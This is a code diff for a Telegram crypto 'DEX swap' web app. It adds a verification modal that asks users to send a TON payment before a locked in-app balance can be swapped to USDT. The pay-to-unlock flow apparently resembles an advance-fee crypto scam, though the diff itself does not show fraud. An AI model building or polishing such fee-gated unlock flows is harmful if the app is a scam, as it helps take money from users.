@@ -1,5 +1,5 @@
 // ============================================================================
-// AXION AI - DEX SWAP v6.0 (PREMIUM)
+// AXION AI - DEX SWAP v7.0 (PREMIUM WITH MODAL)
 // ============================================================================
 
 const tg = window.Telegram?.WebApp;
@@ -53,6 +53,27 @@ const elements = {
     withdrawAmount: document.getElementById('withdrawAmount'),
     withdrawBtn: document.getElementById('withdrawBtn')
 };
+
+// Modal elements
+const modal = document.getElementById('verificationModal');
+const modalProceedBtn = document.getElementById('modalProceedBtn');
+const modalCancelBtn = document.getElementById('modalCancelBtn');
+
+// ============================================================================
+// MODAL FUNCTIONS
+// ============================================================================
+
+function showModal() {
+    if (modal) {
+        modal.classList.add('active');
+    }
+}
+
+function hideModal() {
+    if (modal) {
+        modal.classList.remove('active');
+    }
+}
 
 // ============================================================================
 // CONFETTI EFFECT
@@ -115,23 +136,23 @@ function showConfetti() {
 }
 
 // ============================================================================
-// BUTTON LOCK/UNLOCK VISUALS
+// BUTTON STATE MANAGEMENT
 // ============================================================================
 
-function updateSwapButtonLockState(isLocked) {
+function updateSwapButtonState(isActive) {
     const btn = elements.swapBtn;
     if (!btn) return;
     
-    if (isLocked) {
-        btn.disabled = true;
-        btn.classList.add('locked');
-        btn.classList.remove('unlocked');
-        btn.innerHTML = '<i class="fas fa-lock"></i> CONFIRM SWAP';
+    if (isActive) {
+        btn.disabled = false;
+        btn.classList.remove('locked');
+        btn.classList.add('active');
+        btn.innerHTML = '<i class="fas fa-exchange-alt"></i> CONFIRM SWAP';
     } else {
         btn.disabled = false;
-        btn.classList.add('unlocked');
-        btn.classList.remove('locked');
-        btn.innerHTML = '<i class="fas fa-exchange-alt"></i> CONFIRM SWAP';
+        btn.classList.remove('active');
+        btn.classList.add('locked');
+        btn.innerHTML = '<i class="fas fa-lock"></i> 🔒 SWAP LOCKED';
     }
 }
 
@@ -161,6 +182,20 @@ async function init() {
     await initFirebase();
     initTonConnect();
     await loadUserData();
+    
+    // Setup modal event listeners
+    if (modalProceedBtn) {
+        modalProceedBtn.addEventListener('click', async () => {
+            hideModal();
+            await handleActivation();
+        });
+    }
+    
+    if (modalCancelBtn) {
+        modalCancelBtn.addEventListener('click', () => {
+            hideModal();
+        });
+    }
 }
 
 async function loadConfig() {
@@ -272,11 +307,11 @@ function updateUI() {
     if (elements.fromBalance) elements.fromBalance.innerHTML = balance;
     if (elements.toBalance) elements.toBalance.innerHTML = `$${usdtBalance.toFixed(2)}`;
     
-    // Update button lock state based on tonPaid
+    // Update button based on activation status
     if (currentUser.tonPaid) {
-        updateSwapButtonLockState(false);
+        updateSwapButtonState(true);
     } else {
-        updateSwapButtonLockState(true);
+        updateSwapButtonState(false);
     }
 }
 
@@ -315,7 +350,6 @@ async function handleActivation() {
     
     try {
         showStatus('swapStatus', '⏳ Waiting for payment confirmation...', 'info');
-        updateSwapButtonLockState(true);
         
         const result = await window.tonConnectUI.sendTransaction(transaction);
         
@@ -335,18 +369,18 @@ async function handleActivation() {
             await loadUserData();
             showStatus('swapStatus', '✅ Swap unlocked! You can now swap.', 'success');
             showConfetti();
-            updateSwapButtonLockState(false);
+            updateSwapButtonState(true);
             return true;
         } else {
             showStatus('swapStatus', '❌ ' + (verifyData.error || 'Verification failed'), 'error');
-            updateSwapButtonLockState(true);
+            updateSwapButtonState(false);
             return false;
         }
         
     } catch(error) {
         console.error('Activation error:', error);
         showStatus('swapStatus', '❌ Payment cancelled or failed', 'error');
-        updateSwapButtonLockState(true);
+        updateSwapButtonState(false);
         return false;
     } finally {
         isActivating = false;
@@ -362,18 +396,14 @@ function validateSwapAmount() {
     const balance = currentUser?.balance || 0;
     const isActive = currentUser?.tonPaid === true;
     
-    if (!isActive) {
-        updateSwapButtonLockState(true);
-        return;
-    }
+    if (!isActive) return;
     
     if (isNaN(amount) || amount <= 0) {
-        updateSwapButtonLockState(true);
         return;
     }
     
     const isValid = amount >= CONFIG.minSwap && amount <= balance && amount <= CONFIG.maxSwap;
-    updateSwapButtonLockState(!isValid);
+    // Visual feedback only, button is always clickable for non-active users
 }
 
 if (elements.swapFrom) {
@@ -382,21 +412,19 @@ if (elements.swapFrom) {
         
         if (isNaN(amount) || amount <= 0) {
             if (elements.swapTo) elements.swapTo.value = '';
-            validateSwapAmount();
             return;
         }
         
         const usdtAmount = amount * CONFIG.axcPrice;
         if (elements.swapTo) elements.swapTo.value = usdtAmount.toFixed(2);
-        validateSwapAmount();
     });
 }
 
 if (elements.swapBtn) {
     elements.swapBtn.addEventListener('click', async () => {
-        // If not activated yet, trigger activation flow
+        // If not activated, show modal
         if (!currentUser?.tonPaid) {
-            await handleActivation();
+            showModal();
             return;
         }
         
@@ -422,7 +450,8 @@ if (elements.swapBtn) {
         
         try {
             isSwapping = true;
-            updateSwapButtonLockState(true);
+            elements.swapBtn.disabled = true;
+            elements.swapBtn.innerHTML = '<span class="spinner"></span> Processing...';
             
             const res = await fetch('/api/swap', {
                 method: 'POST',
@@ -444,15 +473,15 @@ if (elements.swapBtn) {
                 }, 2500);
             } else {
                 showStatus('swapStatus', '❌ ' + (data.error || 'Swap failed'), 'error');
-                updateSwapButtonLockState(false);
             }
             
         } catch(error) {
             console.error('Swap error:', error);
             showStatus('swapStatus', '❌ Network error. Please try again.', 'error');
-            updateSwapButtonLockState(false);
         } finally {
             isSwapping = false;
+            elements.swapBtn.disabled = false;
+            updateSwapButtonState(true);
         }
     });
 }
